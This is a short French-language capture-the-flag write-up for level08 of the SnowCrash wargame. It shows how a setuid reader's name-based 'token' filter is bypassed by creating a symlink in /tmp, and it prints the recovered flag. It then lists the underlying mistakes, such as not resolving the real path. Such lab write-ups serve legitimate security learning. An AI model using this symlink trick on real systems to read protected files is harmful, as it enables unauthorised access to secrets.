level 08

je commence par le ls 

ensuite je trouve un executable ./level08 et un fichier name= token

j'execute lexecutable resultat : ./level08 [file to read]

ok il faut un fichier, je vais prendre -> token

level08@SnowCrash:~$ ./level08 token
You may not access 'token'

je vais faire la commande :  nm -u level08 
w _Jv_RegisterClasses
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
         U err@@GLIBC_2.0
         U exit@@GLIBC_2.0
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U read@@GLIBC_2.0
         U strstr@@GLIBC_2.0
         U write@@GLIBC_2.0


j'ai repere strstr -> strstr(argv[1], "token")
Si le mot token est trouvé → accès refusé.

je vais alors changer de mot en faisant : 
level08@SnowCrash:~$ ln -s ~/token /tmp/exploit

ln → crée un lien
-s → lien symbolique (symlink)
~/token → le vrai fichier token (protégé)
/tmp/exploit → le faux nom que tu contrôles

Le système suit le lien symbolique
Il lit le vrai fichier token
Le contenu s’affiche

level08@SnowCrash:~$ ./level08 /tmp/exploit
quif5eloekouj29ke0vouxean

Reussi !!

Attaque : 
Symlink attack + mauvaise validation du chemin

Erreurs classiques :

filtrer le nom au lieu du fichier réel

ne pas utiliser realpath()

ne pas désactiver le suivi des symlinks
